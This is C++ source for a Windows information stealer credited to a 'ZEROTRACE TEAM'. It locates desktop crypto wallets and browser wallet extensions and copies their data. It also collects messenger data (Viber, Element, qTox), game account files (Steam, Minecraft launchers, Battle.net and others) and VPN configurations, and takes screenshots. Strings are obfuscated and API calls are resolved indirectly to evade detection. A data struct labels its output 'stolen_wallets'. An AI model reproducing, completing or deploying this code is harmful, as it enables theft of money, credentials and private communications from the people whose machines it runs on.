//  *** MADE BY ZEROTRACE TEAM *** //
// *** IF YOU COPY , GIVE CREDITS *** //
//  *** DO NOT REUPLOAD WITHOUT CREDITS *** //
//  *** luis22dubuquexvx@hotmail.com *** // Contact LUIS Head Of The Team ;)

#include <Windows.h>
#include <ShlObj.h> 
#include "Functions.h"
#include <chrono>
#include <fstream>
#include <gdiplus.h>
#include <filesystem>
#include <string>
#include <iostream>
#include <map>
#include "resource.h"
#include "secure_string.hpp"
#include "winapi.h"
#include "winapi.h"

using namespace Gdiplus;
using namespace std;
namespace fs = std::filesystem;

#pragma comment(lib, "Shell32.lib")  
#pragma comment(lib, "gdiplus.lib")


const std::map<std::string, std::string> walletPaths = {
    {ENC_STR("Armory"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Armory")},
    {ENC_STR("Atomic"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Atomic\\Local Storage\\leveldb")},
    {ENC_STR("Bitcoin"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Bitcoin\\wallets")},
    {ENC_STR("Bytecoin"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\bytecoin")},
    {ENC_STR("Coinomi"), std::string(getenv(ENC_STR("LOCALAPPDATA"))) + ENC_STR("\\Coinomi\\Coinomi\\wallets")},
    {ENC_STR("Dash"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\DashCore\\wallets")},
    {ENC_STR("Electrum"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Electrum\\wallets")},
    {ENC_STR("Ethereum"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Ethereum\\keystore")},
    {ENC_STR("Exodus"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Exodus\\exodus.wallet")},
    {ENC_STR("Guarda"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Guarda\\Local Storage\\leveldb")},
    {ENC_STR("Jaxx"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb")},
    {ENC_STR("Litecoin"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Litecoin\\wallets")},
    {ENC_STR("MyMonero"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\MyMonero")},
    {ENC_STR("Monero"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Monero")},
    {ENC_STR("Zcash"), std::string(getenv(ENC_STR("APPDATA"))) + ENC_STR("\\Zcash")}
};

const std::map<std::string, std::string> walletExtensions = {
    {ENC_STR("dlcobpjiigpikoobohmabehhmhfoodbb"), ENC_STR("Argent X")},
    {ENC_STR("jiidiaalihmmhddjgbnbgdfflelocpak"), ENC_STR("BitKeep Wallet")},
    {ENC_STR("bopcbmipnjdcdfflfgjdgdjejmgpoaab"), ENC_STR("BlockWallet")},
    {ENC_STR("odbfpeeihdkbihmopkbjmoonfanlbfcl"), ENC_STR("Coinbase")},
    {ENC_STR("hifafgmccdpekplomjjkcfgodnhcellj"), ENC_STR("Crypto.com")},
    {ENC_STR("kkpllkodjeloidieedojogacfhpaihoh"), ENC_STR("Enkrypt")},
    {ENC_STR("mcbigmjiafegjnnogedioegffbooigli"), ENC_STR("Ethos Sui")},
    {ENC_STR("aholpfdialjgjfhomihkjbmgjidlcdno"), ENC_STR("ExodusWeb3")},
    {ENC_STR("hpglfhgfnhbgpjdenjgmdgoeiappafln"), ENC_STR("Guarda")},
    {ENC_STR("afbcbjpbpfadlkmhmclhkeeodmamcflc"), ENC_STR("MathWallet")},
    {ENC_STR("mcohilncbfahbmgdjkbpemcciiolgcge"), ENC_STR("OKX")},
    {ENC_STR("jnmbobjmhlngoefaiojfljckilhhlhcj"), ENC_STR("OneKey")},
    {ENC_STR("fnjhmkhhmkbjkkabndcnnogagogbneec"), ENC_STR("Ronin")},
    {ENC_STR("lgmpcpglpngdoalbgeoldeajfclnhafa"), ENC_STR("SafePal")},
    {ENC_STR("mfgccjchihfkkindfppnaooecgfneiii"), ENC_STR("TokenPocket")},
    {ENC_STR("nphplpgoakhhjchkkhmiggakijnkhfnd"), ENC_STR("Ton")},
    {ENC_STR("amkmjjmmfldogmhpjloimipbofnfjih"), ENC_STR("Wombat")},
    {ENC_STR("heamnjbnflcikcggoiplibfommfbkjpj"), ENC_STR("Zeal")},
    {ENC_STR("jagohholfbnaombfgmademhogekljklp"),ENC_STR("Binance Smart Chain")},
    {ENC_STR("bhghoamapcdpbohphigoooaddinpkbai"),ENC_STR("Authenticator")},
    {ENC_STR("fhbohimaelbohpjbbldcngcnapndodjp"),ENC_STR("Binance")},
    {ENC_STR("fihkakfobkmkjojpchpfgcmhfjnmnfpi"), ENC_STR("Bitapp")},
    {ENC_STR("aodkkagnadcbobfpggfnjeongemjbjca"), ENC_STR("BoltX")},
    {ENC_STR("aeachknmefphepccionboohckonoeemg"), ENC_STR("Coin98")},
    {ENC_STR("hnfanknocfeofbddgcijnmhnfnkdnaad"),ENC_STR("Coinbase")},
    {ENC_STR("agoakfejjabomempkjlepdflaleeobhb"),ENC_STR("Core")},
    {ENC_STR("pnlfjmlcjdjgkddecgincndfgegkecke"),ENC_STR("Crocobit")},
    {ENC_STR("blnieiiffboillknjnepogjhkgnoapac"),ENC_STR("Equal")},
    {ENC_STR("cgeeodpfagjceefieflmdfphplkenlfk"),ENC_STR("Ever")},
    {ENC_STR("ebfidpplhabeedpnhjnobghokpiioolj"),ENC_STR("Fewcha")},
    {ENC_STR("cjmkndjhnagcfbpiemnkdpomccnjblmj"),ENC_STR("Finnie")},
    {ENC_STR("nanjmdknhkinifnkgdcggcfnhdaammmj"), ENC_STR("Guild")},
    {ENC_STR("fnnegphlobjdpkhecapkijjdkgcjhkib"),ENC_STR("HarmonyOutdated")},
    {ENC_STR("flpiciilemghbmfalicajoolhkkenfel"),ENC_STR("Iconex")},
    {ENC_STR("cjelfplplebdjjenllpjcblmjkfcffne"),ENC_STR("Jaxx Liberty")},
    {ENC_STR("jblndlipeogpafnldhgmapagcccfchpi"), ENC_STR("Kaikas")},
    {ENC_STR("pdadjkfkgcafgbceimcpbkalnfnepbnk"), ENC_STR("KardiaChain")},
    {ENC_STR("dmkamcknogkgcdfhhbddcghachkejeap"), ENC_STR("Keplr")},
    {ENC_STR("kpfopkelmapcoipemfendmdcghnegimn"), ENC_STR("Liquality")},
    {ENC_STR("nlbmnnijcnlegkjjpcfjclmcfggfefdm"),ENC_STR("MEWCX")},
    {ENC_STR("dngmlblcodfobpdpecaadgfbcggfjfnm"),ENC_STR("MaiarDEFI")},
    {ENC_STR("efbglgofoippbgcjepnhiblaibcnclgk"),ENC_STR("Martian")},
    {ENC_STR("nkbihfbeogaeaoehlefnkodbefgpgknn"),ENC_STR("Metamask")},
    {ENC_STR("ejbalbakoplchlghecdalmeeeajnimhm"),ENC_STR("Metamask2")},
    {ENC_STR("fcckkdbjnoikooededlapcalpionmalo"),ENC_STR("Mobox")},
    {ENC_STR("lpfcbjknijpeeillifnkikgncikgfhdo"),ENC_STR("Nami")},
    {ENC_STR("jbdaocneiiinmjbjlgalhcelgbejmnid"),ENC_STR("Nifty")},
    {ENC_STR("fhilaheimglignddkjgofkcbgekhenbh"),ENC_STR("Oxygen")},
    {ENC_STR("mgffkfbidihjpoaomajlbgchddlicgpn"),ENC_STR("PaliWallet")},
    {ENC_STR("ejjladinnckdgjemekebdpeokbikhfci"),ENC_STR("Petra")},
    {ENC_STR("bfnaelmomeimhlpmgjnjophhpkkoljpa"), ENC_STR("Phantom")},
    {ENC_STR("phkbamefinggmakgklpkljjmgibohnba"), ENC_STR("Pontem")},
    {ENC_STR("nkddgncdjgjfcddamfgcmfnlhccnimig"), ENC_STR("Saturn")},
    {ENC_STR("pocmplpaccanhmnllbbkpgfliimjljgo"),ENC_STR("Slope")},
    {ENC_STR("bhhhlbepdkbapadjdnnojkbgioiodbic"),ENC_STR("Solfare")},
    {ENC_STR("fhmfendgdocmcbmfikdcogofphimnkno"),ENC_STR("Sollet")},
    {ENC_STR("mfhbebgoclkghebffdldpobeajmbecfk"),ENC_STR("Starcoin")},
    {ENC_STR("cmndjbecilbocjfkibfbifhngkdmjgog"),ENC_STR("Swash")},
    {ENC_STR("ookjlbkiijinhpmnjffcofjonbfbgaoc"),ENC_STR("TempleTezos")},
    {ENC_STR("aiifbnbfobpmeekipheeijimdpnlpgpp"),ENC_STR("TerraStation")},
    {ENC_STR("ibnejdfjmmkpcnlpebklmnkoeoihofec"),ENC_STR("Tron")},
    {ENC_STR("egjidjbpglichdcondbcbdnbeeppgdph"), ENC_STR("Trust Wallet")},
    {ENC_STR("hmeobnfnfcmdkdcmlblgagmfpfboieaf"),ENC_STR("XDEFI")},
    {ENC_STR("eigblbgjknlfbajkfhopmcojidlgcehm"),ENC_STR("XMR.PT")},
    {ENC_STR("bocpokimicclpaiekenaeelehdjllofo"),ENC_STR("XinPay")},
    {ENC_STR("ffnbelfdoeiohenkjibnmadjiehjhajb"),ENC_STR("Yoroi")},
    {ENC_STR("kncchdigobghenbbaddojjnnaogfppfj"),ENC_STR("iWallet")},
    {ENC_STR("epapihdplajcdnnkdeiahlgigofloibg"),ENC_STR("Sender")}
};


std::vector<std::string> ExtractDesktopWallets(const std::string& baseDir) {
    std::vector<std::string> foundWallets;
    std::string walletDir = baseDir + ENC_STR("\\Cryptowallets");
    api::pCreateDirectoryA(walletDir.c_str(), NULL);

    for (const auto& wallet : walletPaths) {
        const std::string& name = wallet.first;
        const std::string& path = wallet.second;

        if (fs::exists(path)) {
            std::string destPath = walletDir + "\\" + name;
            api::pCreateDirectoryA(destPath.c_str(), NULL);

            try {
                for (const auto& file : fs::directory_iterator(path)) {
                    std::string fileDest = destPath + "\\" + file.path().filename().string();
                    api::pCopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
                }
                foundWallets.push_back(name);
            }
            catch (const std::exception& e) {
                std::cerr << ENC_STR("Error copying ") << name << ": " << e.what() << std::endl;
            }
        }
    }
    return foundWallets;
}


std::vector<std::string> ExtractBrowserWallets(const std::string& baseDir) {
    std::vector<std::string> foundExtensions;
    std::string walletExtDir = baseDir + ENC_STR("\\Cryptowallets\\Extensions");
    api::pCreateDirectoryA(walletExtDir.c_str(), NULL);


    std::vector<std::string> browserPaths = {
        std::string(getenv(ENC_STR("LOCALAPPDATA"))) + ENC_STR("\\Google\\Chrome\\User Data\\Default"),
        std::string(getenv(ENC_STR("LOCALAPPDATA"))) + ENC_STR("\\Microsoft\\Edge\\User Data\\Default"),
        std::string(getenv(ENC_STR("LOCALAPPDATA"))) + ENC_STR("\\BraveSoftware\\Brave-Browser\\User Data\\Default")
    };

    for (const auto& browserPath : browserPaths) {
        fs::path extDir = fs::path(browserPath) / ENC_STR("Local Extension Settings");

        if (!fs::exists(extDir)) {
            continue;
        }

        for (const auto& walletExt : walletExtensions) {
            const std::string& extID = walletExt.first;
            const std::string& name = walletExt.second;
            fs::path walletPath = extDir / extID;

            if (fs::exists(walletPath)) {
                std::string destPath = walletExtDir + "\\" + name;
                api::pCreateDirectoryA(destPath.c_str(), NULL);

                try {
                    for (const auto& file : fs::directory_iterator(walletPath)) {
                        std::string fileDest = destPath + "\\" + file.path().filename().string();
                        api::pCopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
                    }
                    foundExtensions.push_back(name);
                }
                catch (const std::exception& e) {
                    std::cerr << ENC_STR("Error copying ") << name << ": " << e.what() << std::endl;
                }
            }
        }
    }
    return foundExtensions;
}


std::vector<std::string> ExtractWallets(const std::wstring& outputPath) {
    std::string narrowPath(outputPath.begin(), outputPath.end());
    
    std::wcout << ENC_WSTR(L"Extracting desktop wallets...") << std::endl;
    std::vector<std::string> desktopWallets = ExtractDesktopWallets(narrowPath);

    std::wcout << ENC_WSTR(L"Extracting browser wallet extensions...") << std::endl;
    std::vector<std::string> browserWallets = ExtractBrowserWallets(narrowPath);
    
    desktopWallets.insert(desktopWallets.end(), browserWallets.begin(), browserWallets.end());
    return desktopWallets;
}



std::wstring GetTempDirectory() {
    wchar_t tempPath[MAX_PATH];
    api::pGetTempPathW(MAX_PATH, tempPath);
    return std::wstring(tempPath);
}



bool CopyFiles(const fs::path& source, const fs::path& destination) {
    try {
        if (!fs::exists(source)) {
            std::wcerr << ENC_WSTR(L"Source directory does not exist: ") << source.wstring() << std::endl;
            return false;
        }

        if (!fs::exists(destination)) {
            fs::create_directories(destination);
        }

        for (const auto& entry : fs::recursive_directory_iterator(source)) {
            const auto& srcPath = entry.path();
            auto destPath = destination / srcPath.lexically_relative(source);

            if (fs::is_directory(srcPath)) {
                fs::create_directories(destPath);
            }
            else {
                fs::copy_file(srcPath, destPath, fs::copy_options::overwrite_existing);
                std::wcout << ENC_WSTR(L"Copied: ") << srcPath.wstring() << ENC_WSTR(L" to ") << destPath.wstring() << std::endl;
            }
        }
        return true;
    }
    catch (const fs::filesystem_error& e) {
        std::wcerr << ENC_WSTR(L"Filesystem error: ") << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::wcerr << ENC_WSTR(L"Error: ") << e.what() << std::endl;
        return false;
    }
}




int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}



bool TakeScreenshot(const wchar_t* filename) {

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    api::pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);


    int width = api::pGetSystemMetrics(SM_CXSCREEN);
    int height = api::pGetSystemMetrics(SM_CYSCREEN);


    HDC screenDC = api::pGetDC(0);
    HDC memDC = api::pCreateCompatibleDC(screenDC);
    HBITMAP hBitmap = api::pCreateCompatibleBitmap(screenDC, width, height);
    api::pSelectObject(memDC, hBitmap);


    api::pBitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);

    Gdiplus::GpBitmap* bitmap = nullptr;
    api::pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &bitmap);


    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);


    Status status = api::pGdipSaveImageToFile(bitmap, filename, &pngClsid, NULL);

    api::pGdipDisposeImage(bitmap);
    api::pDeleteObject(hBitmap);
    api::pDeleteDC(memDC);
    api::pReleaseDC(0, screenDC);


    api::pGdiplusShutdown(gdiplusToken);

    return (status == Ok);
}


bool ExtractElement(const std::wstring& baseDir) {
    wchar_t roamingPath[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roamingPath))) {
        std::wstring elementDir = std::wstring(roamingPath) + ENC_WSTR(L"\\Element");

        if (fs::exists(elementDir)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\Element");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

            try {
                for (const auto& entry : fs::recursive_directory_iterator(elementDir)) {
                    std::wstring relPath = entry.path().wstring().substr(elementDir.length());
                    std::wstring destPath = targetDir + relPath;

                    if (fs::is_directory(entry)) {
                        api::pCreateDirectoryW(destPath.c_str(), NULL);
                    }
                    else {
                        api::pCopyFileW(entry.path().wstring().c_str(), destPath.c_str(), FALSE);
                    }
                }
                std::wcout << ENC_WSTR(L"Element data extracted successfully") << std::endl;
                return true;
            }
            catch (const std::exception& e) {
                std::wcerr << ENC_WSTR(L"Failed to extract Element data") << std::endl;
                return false;
            }
        }
    }
    return false;
}

bool ExtractViber(const std::wstring& baseDir) {
    wchar_t userProfile[MAX_PATH];
    if (api::pGetEnvironmentVariableW(ENC_WSTR(L"USERPROFILE"), userProfile, MAX_PATH)) {
        std::wstring viberDir = std::wstring(userProfile) + ENC_WSTR(L"\\AppData\\Roaming\\ViberPC");

        if (fs::exists(viberDir)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\Viber");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

            try {
                for (const auto& entry : fs::recursive_directory_iterator(viberDir)) {
                    std::wstring relPath = entry.path().wstring().substr(viberDir.length());
                    std::wstring destPath = targetDir + relPath;

                    if (fs::is_directory(entry)) {
                        api::pCreateDirectoryW(destPath.c_str(), NULL);
                    }
                    else {
                        api::pCopyFileW(entry.path().wstring().c_str(), destPath.c_str(), FALSE);
                    }
                }
                std::wcout << ENC_WSTR(L"Viber data extracted successfully") << std::endl;
                return true;
            }
            catch (const std::exception& e) {
                std::wcerr << ENC_WSTR(L"Failed to extract Viber data") << std::endl;
            }
        }
    }
    return false;
}

bool ExtractQTox(const std::wstring& baseDir) {
    wchar_t appdataPath[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath))) {
        std::wstring toxDir = std::wstring(appdataPath) + ENC_WSTR(L"\\Tox");

        if (fs::exists(toxDir)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\QTox");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

            try {
                for (const auto& entry : fs::recursive_directory_iterator(toxDir)) {
                    std::wstring relPath = entry.path().wstring().substr(toxDir.length());
                    std::wstring destPath = targetDir + relPath;

                    if (fs::is_directory(entry)) {
                        api::pCreateDirectoryW(destPath.c_str(), NULL);
                    }
                    else {
                        api::pCopyFileW(entry.path().wstring().c_str(), destPath.c_str(), FALSE);
                    }
                }
                std::wcout << ENC_WSTR(L"QTox data extracted successfully") << std::endl;
                return true;
            }
            catch (const std::exception& e) {
                std::wcerr << ENC_WSTR(L"Failed to extract QTox data") << std::endl;
            }
        }
    }
    return false;
}

bool ExtractMinecraft(const std::wstring& baseDir) {
    wchar_t userProfile[MAX_PATH];
    bool found = false;
    if (api::pGetEnvironmentVariableW(ENC_WSTR(L"USERPROFILE"), userProfile, MAX_PATH)) {
        std::wstring userProfilePath = userProfile;

        std::map<std::wstring, std::wstring> minecraftPaths = {
            {ENC_WSTR(L"Intent"), userProfilePath + ENC_WSTR(L"\\intentlauncher\\launcherconfig")},
            {ENC_WSTR(L"Lunar"), userProfilePath + ENC_WSTR(L"\\.lunarclient\\settings\\game\\accounts.json")},
            {ENC_WSTR(L"TLauncher"), userProfilePath + ENC_WSTR(L"\\AppData\\Roaming\\.minecraft\\TlauncherProfiles.json")},
            {ENC_WSTR(L"Feather"), userProfilePath + ENC_WSTR(L"\\AppData\\Roaming\\.feather\\accounts.json")},
            {ENC_WSTR(L"Meteor"), userProfilePath + ENC_WSTR(L"\\AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt")},
            {ENC_WSTR(L"Impact"), userProfilePath + ENC_WSTR(L"\\AppData\\Roaming\\.minecraft\\Impact\\alts.json")},
            {ENC_WSTR(L"Badlion"), userProfilePath + ENC_WSTR(L"\\AppData\\Roaming\\Badlion Client\\accounts.json")}
        };

        std::wstring targetDir = baseDir + ENC_WSTR(L"\\Minecraft");
        api::pCreateDirectoryW(targetDir.c_str(), NULL);

        for (const auto& entry : minecraftPaths) {
            if (fs::exists(entry.second)) {
                std::wstring destination = targetDir + L"\\" + fs::path(entry.second).filename().wstring();
                api::pCopyFileW(entry.second.c_str(), destination.c_str(), FALSE);
                std::wcout << ENC_WSTR(L"Copied Minecraft ") << entry.first << ENC_WSTR(L" data") << std::endl;
                found = true;
            }
        }
    }
    return found;
}

bool ExtractEpicGames(const std::wstring& baseDir) {
    wchar_t localAppData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring epicGamesFolder = std::wstring(localAppData) + ENC_WSTR(L"\\EpicGamesLauncher");

        if (fs::exists(epicGamesFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\EpicGames");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

     
            std::wstring configPath = epicGamesFolder + ENC_WSTR(L"\\Saved\\Config");
            if (fs::exists(configPath)) {
                CopyFiles(configPath, targetDir + ENC_WSTR(L"\\Config"));
            }

    
            std::wstring logsPath = epicGamesFolder + ENC_WSTR(L"\\Saved\\Logs");
            if (fs::exists(logsPath)) {
                CopyFiles(logsPath, targetDir + ENC_WSTR(L"\\Logs"));
            }

       
            std::wstring dataPath = epicGamesFolder + ENC_WSTR(L"\\Saved\\Data");
            if (fs::exists(dataPath)) {
                CopyFiles(dataPath, targetDir + ENC_WSTR(L"\\Data"));
            }

            std::wcout << ENC_WSTR(L"Epic Games data extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}

bool ExtractUbisoft(const std::wstring& baseDir) {
    wchar_t localAppData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring ubisoftFolder = std::wstring(localAppData) + ENC_WSTR(L"\\Ubisoft Game Launcher");

        if (fs::exists(ubisoftFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\Ubisoft");
            CopyFiles(ubisoftFolder, targetDir);
            std::wcout << ENC_WSTR(L"Ubisoft data extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}

bool ExtractElectronicArts(const std::wstring& baseDir) {
    wchar_t localAppData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring eaFolder = std::wstring(localAppData) + ENC_WSTR(L"\\Electronic Arts\\EA Desktop\\CEF");

        if (fs::exists(eaFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\ElectronicArts");
            CopyFiles(eaFolder, targetDir);
            std::wcout << ENC_WSTR(L"Electronic Arts data extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}

bool ExtractGrowtopia(const std::wstring& baseDir) {
    wchar_t localAppData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring growtopiaFolder = std::wstring(localAppData) + ENC_WSTR(L"\\Growtopia");
        std::wstring saveFile = growtopiaFolder + ENC_WSTR(L"\\save.dat");

        if (fs::exists(saveFile)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\Growtopia");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);
            api::pCopyFileW(saveFile.c_str(), (targetDir + ENC_WSTR(L"\\save.dat")).c_str(), FALSE);
            std::wcout << ENC_WSTR(L"Growtopia save file extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}


bool ExtractBattleNet(const std::wstring& baseDir) {
    wchar_t appData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
        std::wstring battleNetFolder = std::wstring(appData) + ENC_WSTR(L"\\Battle.net");

        if (fs::exists(battleNetFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\BattleNet");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

            try {
                for (const auto& file : fs::directory_iterator(battleNetFolder)) {
                    if (!fs::is_directory(file)) {
                        std::wstring ext = file.path().extension().wstring();
                        if (ext == ENC_WSTR(L".db") || ext == ENC_WSTR(L".config")) {
                            std::wstring destPath = targetDir + L"\\" + file.path().filename().wstring();
                            api::pCopyFileW(file.path().wstring().c_str(), destPath.c_str(), FALSE);
                        }
                    }
                }
                std::wcout << ENC_WSTR(L"Battle.net data extracted successfully") << std::endl;
                return true;
            }
            catch (const std::exception& e) {
                std::wcerr << ENC_WSTR(L"Failed to extract Battle.net data") << std::endl;
            }
        }
    }
    return false;
}

bool ExtractSteam(const std::wstring& baseDir) {
    std::vector<std::wstring> steamPaths = {
        ENC_WSTR(L"C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf"),
        ENC_WSTR(L"C:\\Program Files\\Steam\\config\\loginusers.vdf"),
        ENC_WSTR(L"D:\\Program Files (x86)\\Steam\\config\\loginusers.vdf"),
        ENC_WSTR(L"D:\\Program Files\\Steam\\config\\loginusers.vdf")
    };

    std::wstring targetDir = baseDir + ENC_WSTR(L"\\Steam");
    bool foundSteam = false;

    for (const auto& steamPath : steamPaths) {
        if (fs::exists(steamPath)) {
            if (!foundSteam) {
                api::pCreateDirectoryW(targetDir.c_str(), NULL);
                foundSteam = true;
            }
            std::wstring destPath = targetDir + ENC_WSTR(L"\\loginusers.vdf");
            api::pCopyFileW(steamPath.c_str(), destPath.c_str(), FALSE);

  
            std::wstring configPath = fs::path(steamPath).parent_path().wstring();
            CopyFiles(configPath, targetDir + ENC_WSTR(L"\\config"));

            std::wcout << ENC_WSTR(L"Steam data extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}


bool ExtractProtonVPN(const std::wstring& baseDir) {
    wchar_t localAppData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring protonvpnFolder = std::wstring(localAppData) + ENC_WSTR(L"\\ProtonVPN");

        if (fs::exists(protonvpnFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\ProtonVPN");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

            try {
                for (const auto& entry : fs::directory_iterator(protonvpnFolder)) {
                    std::wstring folderName = entry.path().filename().wstring();
                    if (folderName.find(ENC_WSTR(L"ProtonVPN_Url_")) == 0) {
                        std::wstring destPath = targetDir + L"\\" + folderName;
                        CopyFiles(entry.path().wstring(), destPath);
                    }
                }
                std::wcout << ENC_WSTR(L"ProtonVPN data extracted successfully") << std::endl;
                return true;
            }
            catch (const std::exception& e) {
                std::wcerr << ENC_WSTR(L"Failed to extract ProtonVPN data") << std::endl;
            }
        }
    }
    return false;
}


bool ExtractSurfshark(const std::wstring& baseDir) {
    wchar_t appData[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
        std::wstring surfsharkFolder = std::wstring(appData) + ENC_WSTR(L"\\Surfshark");

        if (fs::exists(surfsharkFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\Surfshark");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

            std::vector<std::wstring> files = {
                ENC_WSTR(L"data.dat"), ENC_WSTR(L"settings.dat"), ENC_WSTR(L"settings-log.dat"), ENC_WSTR(L"private_settings.dat")
            };

            for (const auto& file : files) {
                std::wstring srcPath = surfsharkFolder + L"\\" + file;
                std::wstring dstPath = targetDir + L"\\" + file;
                if (fs::exists(srcPath)) {
                    api::pCopyFileW(srcPath.c_str(), dstPath.c_str(), FALSE);
                }
            }
            std::wcout << ENC_WSTR(L"Surfshark data extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}


bool ExtractOpenVPN(const std::wstring& baseDir) {
    wchar_t userProfile[MAX_PATH];
    if (api::pGetEnvironmentVariableW(ENC_WSTR(L"USERPROFILE"), userProfile, MAX_PATH)) {
        std::wstring openvpnFolder = std::wstring(userProfile) + ENC_WSTR(L"\\AppData\\Roaming\\OpenVPN Connect");

        if (fs::exists(openvpnFolder)) {
            std::wstring targetDir = baseDir + ENC_WSTR(L"\\OpenVPN");
            api::pCreateDirectoryW(targetDir.c_str(), NULL);

    
            std::wstring profilesPath = openvpnFolder + ENC_WSTR(L"\\profiles");
            if (fs::exists(profilesPath)) {
                CopyFiles(profilesPath, targetDir + ENC_WSTR(L"\\profiles"));
            }

    
            std::wstring configPath = openvpnFolder + ENC_WSTR(L"\\config.json");
            if (fs::exists(configPath)) {
                api::pCopyFileW(configPath.c_str(), (targetDir + ENC_WSTR(L"\\config.json")).c_str(), FALSE);
            }

            std::wcout << ENC_WSTR(L"OpenVPN data extracted successfully") << std::endl;
            return true;
        }
    }
    return false;
}

struct ReportData {
    std::vector<std::string> stolen_wallets;
    std::vector<std::string> gaming_services;
    std::vector<std::string> im_services;
    std::vector<std::string> vpn_services;
    int password_count = 0;
    int cookie_count = 0;
};

void ExtractAllServices(const std::wstring& baseDir, ReportData& report) {
    std::wcout << ENC_WSTR(L"\n=== Extracting Additional Services ===\n") << std::endl;

    if (ExtractElement(baseDir)) report.im_services.push_back("Element");
    if (ExtractViber(baseDir)) report.im_services.push_back("Viber");
    if (ExtractQTox(baseDir)) report.im_services.push_back("QTox");
    
    if (ExtractMinecraft(baseDir)) report.gaming_services.push_back("Minecraft");
    if (ExtractEpicGames(baseDir)) report.gaming_services.push_back("Epic Games");
    if (ExtractUbisoft(baseDir)) report.gaming_services.push_back("Ubisoft");
    if (ExtractElectronicArts(baseDir)) report.gaming_services.push_back("Electronic Arts");
    if (ExtractGrowtopia(baseDir)) report.gaming_services.push_back("Growtopia");
    if (ExtractBattleNet(baseDir)) report.gaming_services.push_back("Battle.net");
    if (ExtractSteam(baseDir)) report.gaming_services.push_back("Steam");

    if (ExtractProtonVPN(baseDir)) report.vpn_services.push_back("ProtonVPN");
    if (ExtractSurfshark(baseDir)) report.vpn_services.push_back("Surfshark");
    if (ExtractOpenVPN(baseDir)) report.vpn_services.push_back("OpenVPN");
}

int CountLinesInFile(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) return 0;
    return std::count(std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>(), '\n');
}

